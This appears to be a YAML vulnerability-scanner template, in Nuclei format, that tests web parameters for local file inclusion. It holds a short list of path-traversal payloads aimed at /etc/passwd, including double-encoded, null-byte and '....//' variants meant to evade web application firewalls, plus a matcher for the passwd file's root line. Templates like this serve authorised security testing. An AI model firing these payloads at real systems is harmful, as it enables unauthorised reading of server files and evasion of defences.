http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?file={{payload}}'
  - '{{BaseURL}}/?path={{payload}}'
  - '{{BaseURL}}/?page={{payload}}'
  - '{{BaseURL}}/?doc={{payload}}'
  payloads:
    payload:
    - ../../../../etc/passwd
    - '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd'
    - ../../../../etc/passwd%00
    - ../../../../etc/passwd/./././././.
    - '....//....//....//etc/passwd'
  stop-at-first-match: true
id: advanced-lfi-waf-bypass
info:
  author: thenawabx
  description: Targeted at bypassing modern WAFs using double encoding and traversal
    techniques to read system files.
  name: Advanced LFI Bypass (WAF Evasion)
  severity: high
  tags: lfi, advanced, waf-bypass
